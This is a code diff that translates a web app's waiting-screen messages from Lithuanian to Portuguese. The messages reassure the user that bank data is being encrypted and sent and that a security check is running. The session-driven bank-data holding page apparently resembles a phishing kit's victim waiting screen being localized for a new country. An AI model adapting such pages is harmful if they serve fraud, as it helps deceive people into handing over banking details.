@@ -10,11 +10,11 @@ type Props = {
 };
 
 const MESSAGES = [
-  "Užmezgamas saugus ryšys...",
-  "Banko duomenys užšifruojami ir siunčiami...",
-  "Atliekamas saugumo patikrinimas...",
-  "Prašome palaukti...",
-  "Ryšys autorizuojamas..."
+  "A estabelecer ligação segura...",
+  "Os dados bancários estão a ser encriptados e enviados...",
+  "A realizar verificação de segurança...",
+  "Por favor, aguarde...",
+  "A autorizar a ligação..."
 ];
 
 async function resolveShortIdApi(sessionId: string): Promise<string | null> {
@@ -108,7 +108,7 @@ export function WaitClient({ sessionId, routeSessionId }: Props) {
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
-              Neteisinga nuoroda.
+              Ligação inválida.
             </p>
           </div>
         ) : (
@@ -158,7 +158,7 @@ export function WaitClient({ sessionId, routeSessionId }: Props) {
               <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
               </svg>
-              256 bitų SSL šifravimas
+              Encriptação SSL de 256 bits
             </div>
           </div>
         )}
